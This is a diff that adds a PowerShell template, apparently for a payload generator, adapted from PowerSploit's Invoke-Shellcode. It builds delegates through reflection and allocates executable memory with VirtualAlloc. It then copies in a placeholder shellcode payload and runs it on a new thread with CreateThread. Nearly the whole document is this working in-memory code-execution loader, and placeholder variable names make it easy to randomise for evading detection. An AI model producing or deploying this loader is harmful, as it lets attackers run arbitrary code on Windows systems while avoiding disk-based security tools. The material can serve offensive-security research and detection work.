@@ -1,0 +1,33 @@
+#Added a tweaked by shellster
+#Originally taken from https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
+
+function %{func_get_proc_address} {
+	Param ($%{var_module}, $%{var_procedure})		
+	$%{var_unsafe_native_methods} = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	
+	return $%{var_unsafe_native_methods}.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($%{var_unsafe_native_methods}.GetMethod('GetModuleHandle')).Invoke($null, @($%{var_module})))), $%{var_procedure}))
+}
+
+function %{func_get_delegate_type} {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $%{var_parameters},
+		[Parameter(Position = 1)] [Type] $%{var_return_type} = [Void]
+	)
+	
+	$%{var_type_builder} = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$%{var_type_builder}.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $%{var_parameters}).SetImplementationFlags('Runtime, Managed')
+	$%{var_type_builder}.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $%{var_return_type}, $%{var_parameters}).SetImplementationFlags('Runtime, Managed')
+	
+	return $%{var_type_builder}.CreateType()
+}
+
+%{shellcode}
+		
+$%{var_buffer} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll VirtualAlloc), (%{func_get_delegate_type} @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, [math]::max(0x1000, $%{var_code}.Length), 0x40)
+$%{var_memset} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} msvcrt.dll memset), (%{func_get_delegate_type} @([IntPtr], [UInt32], [UInt32])))
+
+for ($i=0;$i -le ($%{var_code}.Length-1);$i++) {
+	$%{var_memset}.Invoke([IntPtr]($%{var_buffer}.ToInt32()+$i), $%{var_code}[$i], 1) | Out-Null
+}
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll CreateThread), (%{func_get_delegate_type} @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))).Invoke([IntPtr]::Zero,0,$%{var_buffer},[IntPtr]::Zero,0,[IntPtr]::Zero) | Out-Null		
